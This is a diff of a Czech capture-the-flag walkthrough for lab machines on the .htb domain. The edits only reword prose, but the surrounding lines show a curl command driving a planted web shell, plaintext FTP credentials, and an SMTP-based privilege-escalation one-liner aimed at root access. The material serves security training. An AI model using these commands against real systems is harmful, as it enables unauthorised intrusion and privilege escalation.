@@ -103,7 +103,7 @@ curl "http://sec03.rentahacker.htb/shell.php?hidden=echo+\"g3tPr1v\"+>+/dev/ttyR
 
 User flag zde slouží hlavně jako potvrzení, že už mám běžný uživatelský kontext a mohu pokračovat v lokální analýze systému.
 
-V pracovních poznámkách se dochoval úsek, který zachycuje přechod k uživatelskému přístupu a jeho ověření přes `user.txt`.
+Následující úsek zachycuje přechod k uživatelskému přístupu a jeho ověření přes `user.txt`.
 
 ```text
 ftp ib01.supersechosting.htb ib01c01/GetYouAH4t!
@@ -120,7 +120,7 @@ touch /dev/shm/flag;(sleep 0.1 ; echo HELO foo ; sleep 0.1 ; echo 'MAIL FROM:<>'
 
 Tento krok ukazuje, jak se nalezená slabina nebo chyba v delegaci oprávnění mění v privilegovaný přístup.
 
-V poznámkách je zachycen i postup, kterým se potvrzuje privilegovaný přístup a načtení `root.txt`.
+Následující úsek zachycuje i postup, kterým se potvrzuje privilegovaný přístup a načtení `root.txt`.
 
 ```text
 ftp ib01.supersechosting.htb ib01c01/GetYouAH4t!
